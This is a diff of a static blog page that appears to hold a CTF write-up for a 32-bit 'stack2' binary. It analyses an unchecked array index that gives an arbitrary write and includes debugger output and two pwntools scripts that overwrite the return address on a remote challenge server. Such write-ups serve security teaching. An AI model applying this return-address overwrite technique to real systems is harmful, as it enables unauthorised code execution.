@@ -23,7 +23,7 @@
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"300px","content_max_width":"1200px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"300px","content_max_width":"1200px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
   </script>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -183,7 +183,9 @@
                     <div class="meta-info">
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2020-07-29 20:12:33
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-07-29 20:12:33</span>
+        <span class="mobile">2020-07-29 20:12</span>
     </span>
     
         <span class="article-categories article-meta-item">
@@ -316,7 +318,7 @@ int (*v3)(); // [esp+30h] [ebp-54h]
 <h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><p>Still a <code>ret2text</code>(return to <code>.text</code>). Vulnerability exists in <code>main()</code>, belongs to <code>change number</code> subfunction:</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">  v13[v5] = v7;                     &lt;--------vulnerable</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>The index of the array is totally controlled by our input, with no border check, which leads to writing anywhere (the value is controlled by us as well).</p>
-<p>The final goal seems to be <code>hackhere()</code>, we can overwrite <code>ret addr</code> on the stack to execute that function, so the next step is to calculate the target offset/index of array <code>v13</code>.</p>
+<p>The final goal seems to be <code>hackhere()</code>, we can overwrite <code>ret addr</code> on the stack to execute that function, so the next step is to calculate the target offset&#x2F;index of array <code>v13</code>.</p>
 <p>Though we have can see pseudocodes produced by IDA pro indicates the distance from <code>ebp</code> to <code>v13</code>:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char v13[100]; // [esp+38h] [ebp-70h]</span><br></pre></td></tr></table></figure>
 <p>But it uses <code>Canary</code> protection mechanism, memory mapping is like:</p>
@@ -330,9 +332,9 @@ int (*v3)(); // [esp+30h] [ebp-54h]
 <p>Then we need to know where is the <code>ret addr</code>. Its value will be the <code>eip</code> register after this function’s <code>ret</code>, and its location will be the <code>esp</code> before <code>ret</code>.</p>
 <p>Set a breakpoint before <code>ret</code>:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0x080488f2 in main ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────── registers ────</span><br><span class="line">$eax   : 0x0</span><br><span class="line">$ebx   : 0x0</span><br><span class="line">$ecx   : 0xffffd3c0  →  0x00000001</span><br><span class="line">$edx   : 0xffffd31c  →  0x00000005</span><br><span class="line">$esp   : 0xffffd3bc  →  0xf7dfdef1  →  &lt;__libc_start_main+241&gt; add esp, 0x10</span><br><span class="line">$ebp   : 0x0</span><br><span class="line">$esi   : 0xf7fbf000  →  0x001dfd6c</span><br><span class="line">$edi   : 0xf7fbf000  →  0x001dfd6c</span><br><span class="line">$eip   : 0x080488f2  →  &lt;main+802&gt; ret</span><br><span class="line">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063</span><br><span class="line">───────────────────── stack ────</span><br><span class="line">0xffffd3bc│+0x0000: 0xf7dfdef1  →  &lt;__libc_start_main+241&gt; add esp, 0x10         ← $esp</span><br><span class="line">0xffffd3c0│+0x0004: 0x00000001</span><br><span class="line">0xffffd3c4│+0x0008: 0xffffd454  →  0xffffd576  →  &quot;/root/stack2&quot;</span><br><span class="line">0xffffd3c8│+0x000c: 0xffffd45c  →  0xffffd583  →  &quot;SHELL=/bin/bash&quot;</span><br><span class="line">0xffffd3cc│+0x0010: 0xffffd3e4  →  0x00000000</span><br><span class="line">0xffffd3d0│+0x0014: 0x00000001</span><br><span class="line">0xffffd3d4│+0x0018: 0x00000000</span><br><span class="line">0xffffd3d8│+0x001c: 0xf7fbf000  →  0x001dfd6c</span><br><span class="line">─────────────── code:x86:32 ────</span><br><span class="line">    0x80488ea &lt;main+794&gt;       dec    DWORD PTR [ebx-0x723603b3]</span><br><span class="line">    0x80488f0 &lt;main+800&gt;       popa</span><br><span class="line">    0x80488f1 &lt;main+801&gt;       cld</span><br><span class="line"> →  0x80488f2 &lt;main+802&gt;       ret</span><br><span class="line">   ↳  0xf7dfdef1 &lt;__libc_start_main+241&gt; add    esp, 0x10</span><br><span class="line">      0xf7dfdef4 &lt;__libc_start_main+244&gt; sub    esp, 0xc</span><br><span class="line">      0xf7dfdef7 &lt;__libc_start_main+247&gt; push   eax</span><br><span class="line">      0xf7dfdef8 &lt;__libc_start_main+248&gt; call   0xf7e163d0 &lt;exit&gt;</span><br><span class="line">      0xf7dfdefd &lt;__libc_start_main+253&gt; push   esi</span><br><span class="line">      0xf7dfdefe &lt;__libc_start_main+254&gt; push   esi</span><br><span class="line">─────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;stack2&quot;, stopped 0x80488f2 in main (), reason: SINGLE STEP</span><br><span class="line">───────────────────── trace ────</span><br><span class="line">[#0] 0x80488f2 → main()</span><br><span class="line">────────────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
-<p>We can see <code>esp</code> = <code>0xffffd3bc</code>. So <code>ret addr</code> is in <code>0xffffd3bc</code> on the stack.</p>
-<p>Offset/Index = <code>0xffffd3bc</code> - <code>0xffffd338</code> = <code>0x84</code> = <code>132</code></p>
-<p>Another method to calculate the offset is: get <code>ebp</code> after stepping into <code>main()</code>, then get <code>esp</code> before <code>ret</code>, the offset should be: offset/index = <code>esp</code> - <code>v13</code> = <code>esp</code> - (<code>ebp</code> - <code>0x70</code>).</p>
+<p>We can see <code>esp</code> &#x3D; <code>0xffffd3bc</code>. So <code>ret addr</code> is in <code>0xffffd3bc</code> on the stack.</p>
+<p>Offset&#x2F;Index &#x3D; <code>0xffffd3bc</code> - <code>0xffffd338</code> &#x3D; <code>0x84</code> &#x3D; <code>132</code></p>
+<p>Another method to calculate the offset is: get <code>ebp</code> after stepping into <code>main()</code>, then get <code>esp</code> before <code>ret</code>, the offset should be: offset&#x2F;index &#x3D; <code>esp</code> - <code>v13</code> &#x3D; <code>esp</code> - (<code>ebp</code> - <code>0x70</code>).</p>
 <h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><p>Origianl script was:</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./stack2&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">34138</span>)</span><br><span class="line"></span><br><span class="line">hackhere = <span class="string">&#x27;0x0804859B&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;How many numbers you have:\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Give me your numbers\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr, num</span>):</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;5. exit\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x9b</span>)</span><br><span class="line">change(<span class="number">0x85</span>, <span class="number">0x85</span>)</span><br><span class="line">change(<span class="number">0x86</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x87</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>While it went wrong:</p>
@@ -341,6 +343,28 @@ int (*v3)(); // [esp+30h] [ebp-54h]
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./stack2&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">34138</span>)</span><br><span class="line">hackhere = <span class="string">&#x27;0x0804859B&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;How many numbers you have:\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Give me your numbers\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr, num</span>):</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;5. exit\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x85</span>, <span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x86</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x87</span>, <span class="number">0x08</span>)</span><br><span class="line">change(<span class="number">0x8c</span>, <span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x8d</span>, <span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x8e</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x8f</span>, <span class="number">0x08</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">change(0x84, 0x9b)</span></span><br><span class="line"><span class="string">change(0x85, 0x85)</span></span><br><span class="line"><span class="string">change(0x86, 0x04)</span></span><br><span class="line"><span class="string">change(0x87, 0x08)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sh.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
         </div>
 
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/linux/">#linux</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/stack-overflow/">#stack-overflow</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/ctf/">#ctf</a>&nbsp;
+                    </li>
+                
+            </ul>
         
 
         
@@ -396,14 +420,16 @@ int (*v3)(); // [esp+30h] [ebp-54h]
         <div class="copyright-info info-item">
             &copy;
             
-              <span>2018</span>&nbsp;-&nbsp;
+              <span>2020</span>
+              -
             
             2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
         </div>
         
         <div class="theme-info info-item">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
         </div>
+        
         
     </div>
 </footer>
@@ -413,58 +439,19 @@ int (*v3)(); // [esp+30h] [ebp-54h]
 
     
         <div class="post-tools">
-            $li-border-radius = 5px;
-$li-margin-bottom = 12px;
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
 
-.post-tools-container {
-
-  .tools-list {
-
-    li {
-      cursor: pointer;
-      width: $post-tool-button-width;
-      height: $post-tool-button-width;
-      border-radius: 50%;
-      font-size: 1.2rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: $li-margin-bottom;
-      background: var(--background-color);
-      color: var(--default-text-color);
-
-      i {
-        color: var(--default-text-color);
-      }
-
-      &:hover {
-        background: var(--primary-color);
-        color: var(--background-color);
-
-        i {
-          color: var(--background-color);
-        }
-      }
-
-
-      &:last-child {
-        margin-bottom: 0;
-      }
-
-
-      hover-style(true, 1.06, 1.06);
-
-      &.page-aside-toggle {
-        display: none;
-
-        +keep-tablet() {
-          display: none !important;
-        }
-      }
-    }
-  }
-
-}
+        <!-- go comment -->
+        
+    </ul>
+</div>
 
         </div>
     
@@ -523,43 +510,9 @@ $li-margin-bottom = 12px;
         </aside>
     
 
-    .image-viewer-container {
-  position: fixed;
-  left: 0;
-  top: 0;
-  width: 100%;
-  height: 100%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: rgba(0, 0, 0, 0);
-  visibility: hidden;
-  z-index: $z-index-8;
-  padding: 6%;
-  box-sizing: border-box;
-  transition-t("visibility, background", "0, 0", "0.3, 0.3", "ease, ease");
-
-  &.active {
-    background: rgba(0, 0, 0, 0.5);
-    visibility: visible;
-
-    img {
-      cursor: zoom-out;
-      transform: scale(1);
-      padding: 2px;
-      background: var(--background-color);
-    }
-  }
-
-  img {
-    max-width: 100%;
-    max-height: 100%;
-    transform: scale(0);
-    transition-t("transform", "0", "0.3", "ease");
-  }
-}
-
-
+    <div class="image-viewer-container">
+    <img src="">
+</div>
 
 
     
